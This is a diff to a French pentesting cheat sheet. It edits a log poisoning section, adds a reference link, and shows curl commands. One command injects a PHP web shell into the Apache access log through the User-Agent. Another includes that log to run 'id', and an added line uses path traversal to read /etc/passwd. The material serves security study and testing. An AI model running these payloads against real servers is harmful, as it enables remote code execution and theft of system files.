@@ -227,13 +227,15 @@ et `.htaccess`
 
 `allow_url_include = Off` pour PHP<7.4.0
 
-### Apache Log Poisoning
+### Log Poisoning
 
+- https://bughra.dev/posts/log-poison/
 - https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/apache
 
 ```bash
 curl http://example.org/ -A "<?php system(\$_GET['cmd']);?>"
 curl http://example.org/test.php?page=/var/log/apache2/access.log&cmd=id
+curl -X POST "http://example.org/test.php?file=....//....//....//....//etc/passwd" -d "file=logs_existing.txt"
 ```
 
 ### XXE
